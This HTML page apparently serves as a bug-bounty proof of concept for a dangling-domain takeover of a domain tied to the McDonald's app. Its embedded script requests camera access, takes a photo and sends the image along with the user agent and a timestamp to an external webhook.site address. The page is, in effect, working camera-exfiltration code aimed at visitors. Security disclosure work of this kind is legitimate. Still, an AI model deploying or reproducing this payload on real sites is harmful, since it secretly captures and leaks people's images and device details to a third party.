<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Notice</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            text-align: center;
            padding-top: 50px;
        }
        .container {
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            display: inline-block;
            max-width: 500px;
        }
        h1 {
            color: #d32f2f;
        }
        p {
            font-size: 16px;
            line-height: 1.5;
        }
        .btn {
            background-color: #d32f2f;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
        }
        .success {
            color: #2e7d32;
            margin-top: 15px;
            display: none;
        }
        #video {
            display: none;
            width: 100%;
            margin: 10px 0;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Pwned by Deep Chotaliya</h1>
        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research purposes to demonstrate a dangling domain takeover vulnerability in the McDonald's mobile application.</p>
        
        <video id="video" playsinline></video>
        <canvas id="canvas"></canvas>
        
        <button class="btn" onclick="captureAndSend()">Test Camera Exfiltration Proof</button>
        
        <div class="success" id="successMsg">✓ Proof captured and sent!</div>
        <p><small>Bugcrowd Submission Proof</small></p>
    </div>

    <script>
        var stream = null;
        
        function captureAndSend() {
            if (stream) {
                capturePhoto();
                return;
            }
            
            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'environment' },
                audio: false
            }).then(function(mediaStream) {
                stream = mediaStream;
                var video = document.getElementById('video');
                video.srcObject = mediaStream;
                video.play();
                
                setTimeout(capturePhoto, 1000);
            }).catch(function(err) {
                alert('Camera access denied');
                document.getElementById('successMsg').style.display = 'block';
            });
        }
        
        function capturePhoto() {
            var video = document.getElementById('video');
            var canvas = document.getElementById('canvas');
            var ctx = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(function(blob) {
                var formData = new FormData();
                formData.append('image', blob);
                formData.append('domain', 'mymcdonaldsrewards.in');
                formData.append('timestamp', new Date().toISOString());
                formData.append('userAgent', navigator.userAgent);
                
                navigator.sendBeacon('https://webhook.site/21c3a2a3-b9a2-45c6-b5b9-8932ee62d8e6', formData);
                
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                    stream = null;
                }
                
                document.getElementById('successMsg').style.display = 'block';
            });
        }
    </script>
</body>
</html>
